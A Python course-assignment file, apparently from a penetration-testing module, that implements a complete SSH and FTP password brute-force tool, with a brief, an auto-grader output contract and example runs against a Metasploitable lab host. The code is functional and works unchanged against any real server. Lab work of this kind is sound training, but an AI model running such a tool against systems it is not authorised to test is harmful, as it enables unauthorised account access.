"""
================================================================================
COM5413 — The Benji Protocol
Task 3: The Access Validator
File:   brute.py
================================================================================

MISSION BRIEF
-------------
Some doors are locked. Some are locked with the factory default. A good
operative checks quietly, one at a time, without tripping the alarm. Benji
does not kick doors down — he tries the handle first, then tries the spare key,
then the one labelled "admin123" that someone left on a sticky note.

Your job is to build a targeted credential testing tool for SSH and FTP
services. This is a precision instrument, not a battering ram — the mandatory
delay between attempts is not optional, and it is not a courtesy. It is what
separates a professional test from a denial-of-service attack.

WHAT THIS SCRIPT MUST DO
-------------------------
1. Accept target IP, service (ssh/ftp), username, and wordlist path as
   command-line arguments.
2. For FTP: use ftplib to attempt authentication.
3. For SSH: use paramiko to attempt authentication.
4. Iterate through the wordlist, attempting each password in sequence.
5. Include time.sleep(0.1) between each attempt — this is a hard requirement.
6. Stop immediately upon finding valid credentials.
7. Log each attempt (timestamp, username, password tried, result) to a file.

CONSTRAINTS
-----------
- Python 3.10+ only.
- SSH: must use paramiko. FTP: must use ftplib.
- time.sleep(0.1) MUST be present between attempts — auto-grader checks this.
- NO use of input() — all input via argparse.
- Wordlist may contain empty lines and non-ASCII characters — handle both.

OUTPUT CONTRACT (auto-grader depends on this)
---------------------------------------------
On success, print exactly:
    [+] SUCCESS: Password found: <password>

On exhaustion (no valid credentials found), print exactly:
    [-] EXHAUSTED: No valid credentials found for user <username>

EXAMPLE USAGE
-------------
    python brute.py 192.168.56.101 --service ftp --user msfadmin --wordlist rockyou_small.txt
    python brute.py 192.168.56.101 --service ssh --user root --wordlist common_passwords.txt

BUILD LOG
---------
Use docs/build.md to document your testing approach. Record what you observe
when testing against Metasploitable — attempt counts, timing, any connection
drops. This becomes part of your evidence trail.
================================================================================
"""

import argparse
import csv
import ftplib
import socket
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

try:
    import paramiko
except ImportError:
    print("[-] ERROR: paramiko is not installed.", file=sys.stderr)
    sys.exit(1)


def parse_arguments():
    """
    Define and parse command-line arguments.

    Returns the parsed namespace object.
    Required: target (positional), --service, --user, --wordlist
    """
    parser = argparse.ArgumentParser(
        description="Targeted credential testing tool for FTP and SSH."
    )
    parser.add_argument("target", help="Target IP address or hostname")
    parser.add_argument(
        "--service",
        choices=["ftp", "ssh"],
        required=True,
        help="Service to test: ftp or ssh",
    )
    parser.add_argument("--user", required=True, help="Username to test")
    parser.add_argument(
        "--wordlist", type=Path, required=True, help="Path to the password wordlist"
    )
    parser.add_argument(
        "--port",
        type=int,
        default=None,
        help="Optional port override (default: 21 for FTP, 22 for SSH)",
    )
    parser.add_argument(
        "--output",
        type=Path,
        default=Path("attempt_log.csv"),
        help="Path to CSV log file",
    )
    return parser.parse_args()


def load_wordlist(wordlist_path: Path) -> list[str]:
    """
    Load passwords from a wordlist file.

    Args:
        wordlist_path: Path to the wordlist file.

    Returns:
        List of password strings with empty lines and whitespace stripped.

    Raises:
        FileNotFoundError: If wordlist does not exist.
    """
    if not wordlist_path.exists():
        raise FileNotFoundError(f"Wordlist not found: {wordlist_path}")

    with wordlist_path.open("r", encoding="utf-8", errors="ignore") as file:
        return [line.strip() for line in file if line.strip()]


def log_attempt(output_path: Path, user: str, password: str, result: str) -> None:
    """
    Append a single credential attempt to a CSV log file.
    """
    write_header = not output_path.exists() or output_path.stat().st_size == 0

    with output_path.open("a", encoding="utf-8", newline="") as file:
        writer = csv.writer(file)
        if write_header:
            writer.writerow(["timestamp", "username", "password", "result"])
        writer.writerow(
            [
                datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
                user,
                password,
                result,
            ]
        )


def attempt_ftp(target: str, port: int, user: str, password: str) -> bool:
    """
    Attempt FTP authentication using ftplib.

    Args:
        target:   IP address string.
        port:     Port number integer.
        user:     Username string.
        password: Password string to test.

    Returns:
        True if authentication succeeds, False otherwise.
    """
    ftp = ftplib.FTP()
    try:
        ftp.connect(host=target, port=port, timeout=5)
        ftp.login(user=user, passwd=password)
        ftp.quit()
        return True
    except (ftplib.error_perm, ConnectionRefusedError, TimeoutError, OSError):
        return False
    finally:
        try:
            ftp.close()
        except Exception:
            pass


def attempt_ssh(target: str, port: int, user: str, password: str) -> bool:
    """
    Attempt SSH authentication using paramiko.

    Args:
        target:   IP address string.
        port:     Port number integer.
        user:     Username string.
        password: Password string to test.

    Returns:
        True if authentication succeeds, False otherwise.
    """
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(
            hostname=target,
            port=port,
            username=user,
            password=password,
            allow_agent=False,
            look_for_keys=False,
            timeout=5,
            banner_timeout=5,
            auth_timeout=5,
        )
        return True
    except (paramiko.AuthenticationException, paramiko.SSHException, socket.error, OSError):
        return False
    finally:
        client.close()


def main():
    args = parse_arguments()

    port = args.port if args.port is not None else (21 if args.service == "ftp" else 22)

    try:
        passwords = load_wordlist(args.wordlist)
    except FileNotFoundError as error:
        print(f"[-] ERROR: {error}", file=sys.stderr)
        sys.exit(1)

    if not passwords:
        print("[-] ERROR: Wordlist is empty after cleaning.", file=sys.stderr)
        sys.exit(1)

    attempt_function = attempt_ftp if args.service == "ftp" else attempt_ssh

    for password in passwords:
        success = attempt_function(args.target, port, args.user, password)
        log_attempt(
            args.output,
            args.user,
            password,
            "SUCCESS" if success else "FAIL",
        )

        if success:
            print(f"[+] SUCCESS: Password found: {password}")
            return

        time.sleep(0.1)

    print(f"[-] EXHAUSTED: No valid credentials found for user {args.user}")


if __name__ == "__main__":
    main()